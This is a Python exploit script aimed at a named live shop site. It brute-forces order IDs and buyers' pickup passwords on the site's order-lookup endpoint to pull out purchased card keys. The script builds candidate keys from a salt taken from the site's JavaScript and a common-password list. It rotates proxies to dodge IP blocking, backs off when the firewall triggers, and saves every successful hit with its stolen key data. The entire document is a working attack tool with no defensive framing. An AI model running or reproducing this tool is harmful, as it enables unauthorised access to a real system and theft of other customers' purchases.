#!/usr/bin/env python3
"""
xinhe001 order IDOR exploit helper
Target: POST ajax.php?act=order  {id, skey}
skey = 用户下单时填写的「取卡密码」

CSRF: act=order 在 noCsrfActions 白名单，无需 csrf_token (csrf.js)

Usage (when IP not blocked):
  python3 xinhe_idor.py --id 1 --wordlist passwords.txt
  python3 xinhe_idor.py --range 1 5000 --passwords 123456,test,password,888888
"""
import argparse, hashlib, json, time, subprocess, sys, os

try:
    from qingguo_proxy import get_proxy, egress_ip
    HAS_QG = True
except ImportError:
    HAS_QG = False

BASE = "https://xinhe001.lol/shop/ajax.php?act=order"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0"
DELAY = 8
USE_PROXY = os.environ.get("QG_AUTHKEY") and os.environ.get("QG_AUTHPWD")

HASHSALT = "8d6673bb4bde73830ed11c898186a872"  # decoded from faka.js

COMMON_PASSWORDS = [
    "", "1", "123456", "12345678", "888888", "666666", "password",
    "test", "test123", "abc123", "qwerty", "111111", "000000",
    "123123", "a123456", "1234567890", "admin", "root",
    "qq123456", "xinhe001", "xinghe001", "qwe123", "a12345",
    HASHSALT,
]

def gen_skeys(extra=None, order_id=None):
    import hashlib
    s = set(COMMON_PASSWORDS)
    if extra:
        s.update(extra)
    if order_id is not None:
        oid = str(order_id)
        # xinhe fork: user-set 取卡密码; rainbow fallback: md5(id+SYS_KEY+id)
        for a, b in [(oid, HASHSALT), (HASHSALT, oid), (oid, "xinhe001"), (oid, oid)]:
            s.add(hashlib.md5((a + b).encode()).hexdigest())
        s.add(hashlib.md5((oid + HASHSALT + oid).encode()).hexdigest())  # rainbow skey
        s.add(hashlib.md5(oid.encode()).hexdigest())
    return list(s)


def post_order(oid, skey, timeout=20, delay=None):
    d = delay if delay is not None else DELAY
    time.sleep(d)
    data = f"id={oid}&skey={skey}"
    cmd = [
        "curl", "-sS", "-m", str(timeout), "-A", UA,
        "-X", "POST", "-H", "Content-Type: application/x-www-form-urlencoded",
        "-H", "Accept-Language: zh-CN,zh;q=0.9",
        "-H", "Referer: https://xinhe001.lol/shop/?mod=query",
    ]
    if USE_PROXY and HAS_QG:
        try:
            px = get_proxy()
            cmd += ["-x", px["proxy_url"]]
        except Exception as e:
            print(f"[!] proxy error: {e}", file=sys.stderr)
    cmd += ["-d", data, BASE]
    try:
        return subprocess.check_output(cmd, stderr=subprocess.STDOUT).decode("utf-8", "replace")
    except subprocess.CalledProcessError as e:
        return e.output.decode("utf-8", "replace")


def try_id(oid, passwords, verbose=True, delay=None):
    for skey in passwords:
        body = post_order(oid, skey, delay=delay)
        if "reset" in body.lower() or "Empty reply" in body:
            print(f"[!] WAF block on id={oid}, backing off 60s", file=sys.stderr)
            time.sleep(60)
            body = post_order(oid, skey, delay=delay)
        if verbose:
            print(f"  id={oid} skey={skey!r:15} -> {body[:120]}")
        if '"code":0' in body:
            try:
                j = json.loads(body)
                if j.get("kminfo"):
                    return {"hit": True, "id": oid, "skey": skey, "kminfo": j["kminfo"], "full": j}
                return {"hit": True, "id": oid, "skey": skey, "full": j}
            except json.JSONDecodeError:
                return {"hit": True, "id": oid, "skey": skey, "raw": body}
    return {"hit": False, "id": oid}


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--id", type=int)
    ap.add_argument("--range", nargs=2, type=int, metavar=("START", "END"))
    ap.add_argument("--passwords", default="", help="comma-separated extra passwords")
    ap.add_argument("--wordlist", help="password file")
    ap.add_argument("-o", "--output", default="xinhe_idor_hits.json")
    ap.add_argument("--delay", type=float, default=DELAY, help="seconds between requests")
    args = ap.parse_args()
    req_delay = args.delay

    if USE_PROXY:
        print(f"[*] 青果代理已启用, egress={egress_ip() if HAS_QG else '?'}", flush=True)
    elif HAS_QG:
        print("[*] 未设置 QG_AUTHKEY/QG_AUTHPWD，直连模式", flush=True)

    extra = args.passwords.split(",") if args.passwords else None
    if args.wordlist:
        with open(args.wordlist) as f:
            extra = (extra or []) + [l.strip() for l in f if l.strip()]

    ids = []
    if args.id:
        ids = [args.id]
    elif args.range:
        ids = list(range(args.range[0], args.range[1] + 1))
    else:
        ap.print_help()
        return

    hits = []
    for oid in ids:
        pw = gen_skeys(extra, order_id=oid)
        print(f"[*] probing order id={oid} ({len(pw)} passwords)", flush=True)
        r = try_id(oid, pw, delay=req_delay)
        if r["hit"]:
            print(f"[+] HIT id={oid} skey={r['skey']}", flush=True)
            if "kminfo" in r:
                print(f"    KMINFO: {r['kminfo'][:200]}", flush=True)
            hits.append(r)

    with open(args.output, "w") as f:
        json.dump(hits, f, ensure_ascii=False, indent=2)
    print(f"[*] done: {len(hits)} hits -> {args.output}", flush=True)


if __name__ == "__main__":
    main()
